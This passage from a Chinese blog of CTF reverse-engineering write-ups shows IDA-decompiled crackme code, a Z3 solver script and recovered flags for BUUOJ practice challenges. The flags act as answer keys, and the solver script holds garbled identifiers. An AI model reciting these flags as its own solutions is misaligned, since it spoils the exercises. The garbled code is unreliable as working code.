class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v3; <span class="comment">// si</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er10</span></span><br><span class="line">  __int64 v10; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">void</span> **v11; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">void</span> **v12; <span class="comment">// r8</span></span><br><span class="line">  __int64 v13; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v14; <span class="comment">// r15</span></span><br><span class="line">  __int64 v15; <span class="comment">// r12</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v18; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v19; <span class="comment">// rdi</span></span><br><span class="line">  __int64 *v20; <span class="comment">// r14</span></span><br><span class="line">  __int64 v21; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v22; <span class="comment">// r13</span></span><br><span class="line">  __int64 *v23; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v24; <span class="comment">// r8</span></span><br><span class="line">  __int64 v25; <span class="comment">// r12</span></span><br><span class="line">  __int64 v26; <span class="comment">// r15</span></span><br><span class="line">  __int64 v27; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v28; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v29; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v30; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v31; <span class="comment">// r10</span></span><br><span class="line">  __int64 v32; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v33; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// dl</span></span><br><span class="line">  __int64 v35; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v36; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v37; <span class="comment">// rax</span></span><br><span class="line">  __int64 v38; <span class="comment">// r8</span></span><br><span class="line">  __int64 v39; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v40; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v42; <span class="comment">// [rsp+20h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">void</span> *Block[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v44; <span class="comment">// [rsp+40h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v45; <span class="comment">// [rsp+48h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">0</span>i64;</span><br><span class="line">  v45 = <span class="number">15</span>i64;</span><br><span class="line">  LOBYTE(Block[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  v4 = sub_7FF69CF519C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;</span>, envp);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, sub_7FF69CF51B90);</span><br><span class="line">  sub_7FF69CF519C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Let&#x27;s start our game,Please input your flag:&quot;</span>, v5);</span><br><span class="line">  sub_7FF69CF51DE0(<span class="built_in">std</span>::<span class="built_in">cin</span>, Block);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, sub_7FF69CF51B90);</span><br><span class="line">  <span class="keyword">if</span> ( v44 - <span class="number">5</span> &gt; <span class="number">0x19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v39 = sub_7FF69CF519C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Wrong input ,no GXY&#123;&#125; in input words&quot;</span>, v6);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v39, sub_7FF69CF51B90);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> __int8 *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>ui64);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)v7 = <span class="number">0</span>i64;</span><br><span class="line">    *((_QWORD *)v7 + <span class="number">1</span>) = <span class="number">0</span>i64;</span><br><span class="line">    *((_QWORD *)v7 + <span class="number">2</span>) = <span class="number">0</span>i64;</span><br><span class="line">    *((_QWORD *)v7 + <span class="number">3</span>) = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v44 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = Block;</span><br><span class="line">      <span class="keyword">if</span> ( v45 &gt;= <span class="number">0x10</span> )</span><br><span class="line">        v11 = (<span class="keyword">void</span> **)Block[<span class="number">0</span>];</span><br><span class="line">      v12 = &amp;qword_7FF69CF56048;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)qword_7FF69CF56060 &gt;= <span class="number">0x10</span> )</span><br><span class="line">        v12 = (<span class="keyword">void</span> **)qword_7FF69CF56048;</span><br><span class="line">      v8[v10] = *((byte_0 *)v11 + v10) ^ *((byte_0 *)v12 + v9 % <span class="number">27</span>);</span><br><span class="line">      ++v9;</span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 &lt; v44 );</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">0</span>i64;</span><br><span class="line">  v14 = <span class="number">0</span>i64;</span><br><span class="line">  v15 = <span class="number">0</span>i64;</span><br><span class="line">  v16 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v44 &gt; <span class="number">30</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v44 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v18 = v8;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v19 = *v18 + v13;</span><br><span class="line">    ++v17;</span><br><span class="line">    ++v18;</span><br><span class="line">    <span class="keyword">switch</span> ( v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v16 = v19;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        v15 = v19;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">        v14 = v19;</span><br><span class="line">LABEL_23:</span><br><span class="line">        v19 = <span class="number">0</span>i64;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">        sub_7FF69CF519C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;ERRO,out of range&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v44);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = v19 &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v17 &lt; (<span class="keyword">int</span>)v44 );</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (__int64 *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>ui64);</span><br><span class="line">    *v20 = v16;</span><br><span class="line">    v20[<span class="number">1</span>] = v15;</span><br><span class="line">    v20[<span class="number">2</span>] = v14;</span><br><span class="line">    v20[<span class="number">3</span>] = v13;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  v20 = <span class="number">0</span>i64;</span><br><span class="line">LABEL_28:</span><br><span class="line">  v42 = v20[<span class="number">2</span>];</span><br><span class="line">  v21 = v20[<span class="number">1</span>];</span><br><span class="line">  v22 = *v20;</span><br><span class="line">  v23 = (__int64 *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF69CF519C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Hi , DO not debug me !&quot;</span>, v24);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v25 = v21 &amp; v22;</span><br><span class="line">  *v23 = v21 &amp; v22;</span><br><span class="line">  v26 = v42 &amp; ~v22;</span><br><span class="line">  v23[<span class="number">1</span>] = v26;</span><br><span class="line">  v27 = ~v21;</span><br><span class="line">  v28 = v42 &amp; v27;</span><br><span class="line">  v23[<span class="number">2</span>] = v42 &amp; v27;</span><br><span class="line">  v29 = v22 &amp; v27;</span><br><span class="line">  v23[<span class="number">3</span>] = v29;</span><br><span class="line">  <span class="keyword">if</span> ( v26 != <span class="number">0x11204161012</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    v23[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v26 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v30 = v26 | v25 | v28 | v29;</span><br><span class="line">  v31 = v20[<span class="number">1</span>];</span><br><span class="line">  v32 = v20[<span class="number">2</span>];</span><br><span class="line">  v33 = v28 &amp; *v20 | v32 &amp; (v25 | v31 &amp; ~*v20 | ~(v31 | *v20));</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v33 == <span class="number">0x8020717153E3013</span>i64 )</span><br><span class="line">    v34 = v30 == <span class="number">0x3E3A4717373E7F1F</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (v30 ^ v20[<span class="number">3</span>]) == <span class="number">0x3E3A4717050F791F</span>i64 )</span><br><span class="line">    v3 = v34;</span><br><span class="line">  <span class="keyword">if</span> ( (v26 | v25 | v31 &amp; v32) == (~*v20 &amp; v32 | <span class="number">0xC00020130082C0C</span>i64) &amp;&amp; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = sub_7FF69CF519C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Congratulations!flag is GXY&#123;&quot;</span>, v33);</span><br><span class="line">    v36 = Block;</span><br><span class="line">    <span class="keyword">if</span> ( v45 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v36 = (<span class="keyword">void</span> **)Block[<span class="number">0</span>];</span><br><span class="line">    v37 = sub_7FF69CF51FD0(v35, v36, v44);</span><br><span class="line">    sub_7FF69CF519C0(v37, <span class="string">&quot;&#125;&quot;</span>, v38);</span><br><span class="line">    j_j_free(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF69CF519C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Wrong answer!try again&quot;</span>, v33);</span><br><span class="line">    j_j_free(v8);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_43:</span><br><span class="line">  <span class="keyword">if</span> ( v45 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v40 = Block[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v45 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v40 = (<span class="keyword">void</span> *)*((_QWORD *)Block[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(Block[<span class="number">0</span>] - v40 - <span class="number">8</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    j_j_free(v40);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数一堆的运算过程看起来有点无从下手<br />仔细分析一遍之后可以得出下面的流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">v12 &#x3D; &quot;i_will_check_is_debug_or_not&quot;</span><br><span class="line">v8 &#x3D; plain ^ v12</span><br><span class="line">v16 &#x3D; v8[:8]</span><br><span class="line">v15 &#x3D; v8[8:16]</span><br><span class="line">v14 &#x3D; v8[16:24]</span><br><span class="line">v13 &#x3D; v8[24:]</span><br><span class="line">v25 &#x3D; v15 &amp; v16</span><br><span class="line">v26 &#x3D; v14 &amp; ~v16</span><br><span class="line">v27 &#x3D; ~v15</span><br><span class="line">v28 &#x3D; v14 &amp; ~v15</span><br><span class="line">v29 &#x3D; v16 &amp; ~v15</span><br><span class="line">v23[0] &#x3D; v15 &amp; v16</span><br><span class="line">v23[1] &#x3D; v14 &amp; ~v16</span><br><span class="line">v23[2] &#x3D; v14 &amp; ~v15</span><br><span class="line">v23[3] &#x3D; v16 &amp; ~v15</span><br><span class="line">v14 &amp; ~v16 &#x3D;&#x3D; 0x11204161012</span><br><span class="line">v30 &#x3D; v25 | v26 | v28 | v29 &#x3D;&#x3D; 0x3E3A4717373E7F1F</span><br><span class="line">v31 &#x3D; v15</span><br><span class="line">v32 &#x3D; v14</span><br><span class="line">v33 &#x3D; v28 &amp; v16 | v32 &amp; (v25 | v31 &amp; ~v16 | ~(v31 | v16)) &#x3D;&#x3D; 0x8020717153E3013</span><br><span class="line">v30 ^ v13 &#x3D;&#x3D; 0x3E3A4717050F791F</span><br><span class="line">(v26 | v25 | v31 &amp; v32) &#x3D;&#x3D; (~v16 &amp; v32 | 0xC00020130082C0C)</span><br></pre></td></tr></table></figure><p>其中v12需要使用动调来获得内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8[v10] = *((byte_0 *)v11 + v10) ^ *((byte_0 *)v12 + v9 % <span class="number">27</span>);</span><br></pre></td></tr></table></figure><p>同时我们可以根据这条代码来推测flag内容的长度应该为27</p><p>Z3解方程组</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">v13, v14, v15, v16 = BitVecs(<span class="string">&quot;v13 v14 v15 v16&quot;</span>, <span class="number">64</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(v14 &amp; ~v16 == <span class="number">0x11204161012</span>)</span><br><span class="line">s.add((v15 &amp; v16)|(v14 &amp; ~v16)|(v14 &amp; ~v15)|(v16 &amp; ~v15) == <span class="number">0x3E3A4717373E7F1F</span>)</span><br><span class="line">s.add(((v14 &amp; ~v15) &amp; v16)| (v14 &amp; (v15 &amp; v16 | v15 &amp; ~v16 | ~(v15 | v16))) == <span class="number">0x8020717153E3013</span>)</span><br><span class="line">s.add(<span class="number">0x3E3A4717373E7F1F</span> ^ v13 == <span class="number">0x3E3A4717050F791F</span>)</span><br><span class="line">s.add(((v14 &amp; ~v16) | (v15 &amp; v16) | (v15 &amp; v14)) == (~v16 &amp; v14 | <span class="number">0xC00020130082C0C</span>))</span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">print(m)</span></span><br><span class="line"><span class="string">[v13 = 842073600,</span></span><br><span class="line"><span class="string"> v16 = 4483973367147818765,</span></span><br><span class="line"><span class="string"> v14 = 577031497978884115,</span></span><br><span class="line"><span class="string"> v15 = 864693882343402508]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">b&quot;&quot;</span></span><br><span class="line">v12 = <span class="string">&quot;i_will_check_is_debug_or_no&quot;</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">m = [<span class="number">4483973367147818765</span>, <span class="number">864693882343402508</span>, <span class="number">577031497978884115</span>, <span class="number">842073600</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> m:</span><br><span class="line">  cipher += long_tobyte_0s(_)</span><br><span class="line">print(cipher)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">  flag += <span class="built_in">chr</span>(cipher[_] ^ <span class="built_in">ord</span>(v12[_]))</span><br><span class="line">flag += <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>貌似是因为多解的原因<br />导致最后得到的flag不正确<br />所以比赛时给出了flag的第二部分<code>&quot;e!P0or_a&quot;</code></p><blockquote><p><strong>flag{We1l_D0ne!P0or_algebra_am_i}</strong></p></blockquote><hr /><h1 id="wustctf2020level4"><a class="markdownIt-Anchor" href="#wustctf2020level4"></a> [WUSTCTF2020]level4</h1><p>链接: <a href="https://buuoj.cn/challenges#%5BWUSTCTF2020%5Dlevel4">https://buuoj.cn/challenges#[WUSTCTF2020]level4</a></p><p>ELF 64</p><p>IDA中 <strong>main</strong> 函数反编译结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Practice my Data Structure code.....&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;</span>);</span><br><span class="line">  init(<span class="string">&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;</span>, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Traversal!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Traversal type 1:&quot;</span>);</span><br><span class="line">  type1(&amp;unk_601290);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nTraversal type 2:&quot;</span>);</span><br><span class="line">  type2(&amp;unk_601290);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nTraversal type 3:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    //type3(&amp;x[22]);   No way!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_400A37);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二叉树中序遍历</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">type1</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    type1(*((_QWORD *)a1 + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">putchar</span>(*a1);</span><br><span class="line">    result = type1(*((_QWORD *)a1 + <span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二叉树后序遍历</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">type2</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    type2(*((_QWORD *)a1 + <span class="number">1</span>));</span><br><span class="line">    type2(*((_QWORD *)a1 + <span class="number">2</span>));</span><br><span class="line">    result = <span class="built_in">putchar</span>(*a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合输出结果来看<br />先序遍历的输出结果应该就是flag</p><p>这里不会写转换脚本<br />直接在IDA里面<strong>动调</strong>看<code>unk_601290</code>的数据结构了</p><p><code>数据+8Byte</code> 是左子节点的地址<br /><code>数据+16Byte</code> 是右子节点的地址</p><blockquote><p><strong>flag{This_IS_A_7reE}</strong></p></blockquote><hr /><h1 id="guet-ctf2019number_game"><a class="markdownIt-Anchor" href="#guet-ctf2019number_game"></a> [GUET-CTF2019]number_game</h1><p>链接: <a href="https://buuoj.cn/challenges#%5BGUET-CTF2019%5Dnumber_game">https://buuoj.cn/challenges#[GUET-CTF2019]number_game</a></p><p>ELF 64</p><p>IDA中 <strong>main</strong> 函数反编译结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  __int16 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_4006D6((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_400758((__int64)&amp;v5, <span class="number">0</span>, <span class="number">0xA</span>u);</span><br><span class="line">    sub_400807((__int64)v4, (__int64)&amp;v7);</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    sub_400881((<span class="keyword">char</span> *)&amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400917() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;TQL!&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;your are cxk!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span 